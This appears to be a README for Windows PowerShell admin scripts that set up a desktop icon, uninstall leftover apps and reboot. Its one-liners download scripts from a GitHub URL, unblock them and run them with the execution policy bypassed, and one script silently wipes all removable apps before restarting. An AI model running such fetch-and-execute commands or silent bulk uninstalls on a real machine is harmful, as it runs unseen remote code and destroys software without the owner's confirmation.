# Admin Setup

IT admin workstation scripts for Windows.

Repo: [e24g4vewetq3gwerb/Admin-setup](https://github.com/e24g4vewetq3gwerb/Admin-setup)

## Scripts

| File | Behavior |
|------|----------|
| [Admin-Setup.ps1](Admin-Setup.ps1) | Desktop icon, Yes/No offer for Grok Bot + Chrome, then wipe leftover apps and restart |
| [Clear-Apps-Restart.ps1](Clear-Apps-Restart.ps1) | **No Yes/No boxes.** Uninstalls removable apps, then restarts |
| [Remove-InstalledList.ps1](Remove-InstalledList.ps1) | Targets leftover Settings rows: Snipping Tool + winget source V2 |

## Remove leftover Installed apps rows

Use this when Settings still shows **Snipping Tool** and **Windows Package Manager Source (winget) V2** after a wipe.

Does **not** try to delete `Microsoft.DesktopAppInstaller`. That package returns `0x80070032` (not supported).

```powershell
irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Remove-InstalledList.ps1 -OutFile "$env:USERPROFILE\admin\Remove-InstalledList.ps1"
Unblock-File "$env:USERPROFILE\admin\Remove-InstalledList.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -File "$env:USERPROFILE\admin\Remove-InstalledList.ps1"
```

## Clear-Apps-Restart (silent)

No MessageBox. No Read-Host. No "are you sure?".

Windows UAC still appears if the process is not already elevated. That is the OS, not this script.

Keeps drivers, Visual C++ / .NET, Edge / WebView2, App Installer, and other non-removable system packages. Snipping Tool and the winget *source* package are removable and are not kept.

### One-liner

```powershell
New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\admin" | Out-Null
irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Clear-Apps-Restart.ps1 -OutFile "$env:USERPROFILE\admin\Clear-Apps-Restart.ps1"
Unblock-File "$env:USERPROFILE\admin\Clear-Apps-Restart.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -File "$env:USERPROFILE\admin\Clear-Apps-Restart.ps1"
```

Wipe only (no reboot):

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File "$env:USERPROFILE\admin\Clear-Apps-Restart.ps1" -NoRestart
```

Cancel a pending reboot: `shutdown /a`

Log: `%USERPROFILE%\admin\Clear-Apps-Restart.log`

## Admin-Setup (prompted)

```powershell
New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\admin" | Out-Null
irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1 -OutFile "$env:USERPROFILE\admin\Admin-Setup.ps1"
Unblock-File "$env:USERPROFILE\admin\Admin-Setup.ps1"
powershell -ExecutionPolicy Bypass -File "$env:USERPROFILE\admin\Admin-Setup.ps1" -IconOnly
```
